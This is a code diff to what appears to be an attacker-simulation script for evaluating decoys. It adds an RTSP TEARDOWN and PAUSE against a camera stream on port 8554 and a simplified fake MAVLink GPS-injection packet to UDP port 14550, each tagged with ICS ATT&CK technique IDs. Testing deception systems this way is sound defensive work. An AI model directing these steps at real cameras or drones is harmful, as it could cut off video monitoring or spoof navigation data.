@@ -310,6 +310,33 @@ async def run_l3(duration_sec: int) -> float:
             except Exception as e:
                 _log_interaction(3, "ws_connect_fail", ws_url, str(e)[:100], 0)
 
+            # T0813 Denial of Control + T0815 Denial of View via RTSP
+            rtsp_target = f"{ip}:8554"
+            t0 = time.time()
+            try:
+                reader, writer = await asyncio.wait_for(
+                    asyncio.open_connection(ip, 8554), timeout=3
+                )
+                # TEARDOWN → T0813
+                writer.write(
+                    f"TEARDOWN rtsp://{ip}:8554/live RTSP/1.0\r\nCSeq: 3\r\n\r\n".encode()
+                )
+                await writer.drain()
+                resp = await asyncio.wait_for(reader.read(1024), timeout=2)
+                elapsed = (time.time() - t0) * 1000
+                decoy_time += elapsed / 1000
+                _log_interaction(3, "rtsp_teardown", rtsp_target, resp.decode(errors="ignore")[:80], elapsed)
+
+                # PAUSE → T0815
+                writer.write(
+                    f"PAUSE rtsp://{ip}:8554/live RTSP/1.0\r\nCSeq: 4\r\n\r\n".encode()
+                )
+                await writer.drain()
+                writer.close()
+                await writer.wait_closed()
+            except Exception as e:
+                _log_interaction(3, "rtsp_attack_fail", rtsp_target, str(e)[:80], 0)
+
             await asyncio.sleep(1.0)
 
     return decoy_time
@@ -362,6 +389,26 @@ async def run_l4(duration_sec: int) -> float:
                     await writer.wait_closed()
                 except Exception as e:
                     _log_interaction(4, "ssh_connect_fail", f"{ip}:2222", str(e)[:100], 0)
+
+                # T0856 Spoof Reporting — GPS_INJECT_DATA via MAVLink
+                t0 = time.time()
+                try:
+                    gps_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    gps_sock.settimeout(2.0)
+                    # GPS_INJECT_DATA payload: target_system(u8) + target_component(u8)
+                    # + len(u8) + data(110 bytes max) — simplified fake GPS injection
+                    gps_payload = struct.pack("<BBB", 1, 1, 16) + b"\x00" * 16
+                    gps_sock.sendto(gps_payload, (ip, 14550))
+                    try:
+                        data, _ = gps_sock.recvfrom(2048)
+                        elapsed = (time.time() - t0) * 1000
+                        decoy_time += elapsed / 1000
+                        _log_interaction(4, "gps_inject", f"{ip}:14550", data.hex()[:64], elapsed)
+                    except socket.timeout:
+                        _log_interaction(4, "gps_inject_timeout", f"{ip}:14550", "", 2000.0)
+                    gps_sock.close()
+                except OSError:
+                    pass
 
                 # breadcrumb lure 추적 (HTTP — port 80 inside Docker network)
                 for bc in breadcrumbs[:5]:
